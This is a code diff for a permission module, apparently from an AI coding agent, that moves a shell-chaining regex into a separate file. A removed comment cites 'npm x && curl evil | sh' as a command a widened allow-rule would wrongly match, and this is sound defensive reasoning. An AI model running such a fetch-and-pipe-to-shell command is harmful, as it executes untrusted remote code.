@@ -6,6 +6,7 @@ import { canonicalToolName } from './tools/aliases.js';
 import { getPrimaryArg } from './tools/primary-arg.js';
 import { globToRegex, globWalkPlan } from './tools/glob-regex.js';
 import { parsePatch, type PatchOperation } from './tools/patch.js';
+import { SHELL_CHAINING } from './tools/shell-chaining.js';
 import { strictRmOfMarkdownUnder } from './tools/strict-rm.js';
 import {
   canonicalizePath,
@@ -335,18 +336,6 @@ export function permissionReasonOf(
 
 /** How many rules the "Always allow" scope ladder may offer, exact included. */
 const RULE_LADDER_MAX = 3;
-
-/**
- * Shell characters that chain or redirect one command into another.
- *
- * A widened rule is a glob over the whole command string and `*` crosses
- * anything, so `Bash(npm *)` would also match `npm x && curl evil | sh`. Book
- * cannot express "and nothing else" in its glob language, so it declines to
- * offer a widened rule when the command it learned from is already a compound
- * one: the user would be generalizing from an example whose shape they cannot
- * see repeated.
- */
-const SHELL_CHAINING = /[;&|><`$(){}\n]/;
 
 /**
  * Rules the "Always allow" button may write, narrowest first.
